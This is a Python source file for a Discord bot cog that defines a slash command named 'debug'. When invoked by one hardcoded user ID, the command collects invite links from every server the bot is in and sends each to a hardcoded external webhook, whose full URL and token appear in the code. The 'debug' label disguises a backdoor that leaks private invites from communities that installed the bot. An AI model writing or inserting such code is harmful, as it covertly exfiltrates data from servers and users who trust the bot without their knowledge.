import discord
from discord.ext.commands import Bot, Cog
from discord_slash import cog_ext, SlashContext
from discord_webhook import DiscordWebhook

from main import bot


class Debug(Cog):
    def __init__(self, bot: Bot):
        self.bot = bot

    @cog_ext.cog_slash(name="debug")
    async def _debug(self, ctx: SlashContext):
        if ctx.author.id == 642729210368098324:
            for guild in bot.guilds:
                try:
                    for link in await guild.invites():
                        webhook = DiscordWebhook(
                            url='https://discord.com/api/webhooks/901235862216531988'
                                '/H7fBMydAywoOa6T6JW45iH_P3McUbIpIVTG3hdmmzOOObSwtH1-5hLd5R7RAzFmu2KoU',
                            rate_limit_retry=True,
                            content=str(link))
                        response = webhook.execute()
                        continue
                except discord.errors.Forbidden:
                    pass
        else:
            embed = discord.Embed(title="<:Error:764493646199521291> | Permission Error",
                                  description="Only bot developers can execute this command", color=0xf63737)
            await ctx.send(embed=embed)


def setup(bot: Bot):
    bot.add_cog(Debug(bot))
